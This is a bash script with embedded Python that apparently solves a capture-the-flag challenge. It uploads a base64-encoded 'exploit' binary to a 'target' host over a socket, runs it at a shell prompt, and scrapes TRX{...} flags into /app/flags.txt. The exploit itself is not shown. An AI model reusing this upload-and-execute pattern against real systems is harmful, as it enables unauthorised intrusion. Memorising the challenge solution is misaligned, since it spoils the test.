#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
cd "$SCRIPT_DIR/upstream-solve"

python3 - <<'PY'
from __future__ import annotations

import base64
import pathlib
import re
import socket

payload = base64.b64encode(pathlib.Path("exploit").read_bytes()) + b"\n"

def recv_until(sock: socket.socket, needle: bytes, buf: bytearray) -> bytes:
    while needle not in buf:
        data = sock.recv(4096)
        if not data:
            raise EOFError(f"connection closed while waiting for {needle!r}: {bytes(buf[-1000:])!r}")
        buf.extend(data)
    out = bytes(buf)
    del buf[:]
    return out

last_output = b""
flag = None
for attempt in range(1, 6):
    try:
        with socket.create_connection(("target", 8136), timeout=30) as sock:
            sock.settimeout(240)
            buf = bytearray(sock.recv(4096))
            sock.sendall(b"BABELOFENTDEALER\n")
            recv_until(sock, b"exploit:", buf)
            sock.sendall(payload)
            output = bytearray()
            for _ in range(3):
                output.extend(recv_until(sock, b"~ $ ", buf))
                sock.sendall(b"/exploit\n")
            while len(re.findall(rb"TRX\{[^}\r\n]+\}", output)) < 4:
                data = sock.recv(4096)
                if not data:
                    break
                output.extend(data)
        last_output = bytes(output)
        matches = re.findall(rb"TRX\{[^}\r\n]+\}", last_output)
        if matches:
            flag = matches[-1].decode()
            break
    except (EOFError, OSError, TimeoutError) as exc:
        last_output = f"attempt {attempt} failed: {exc}".encode()
if flag is None:
    raise SystemExit(f"flag not found in baby_smallest_revenge output: {last_output[-1000:]!r}")
pathlib.Path("/app/flags.txt").write_text(flag + "\n")
print(flag)
PY
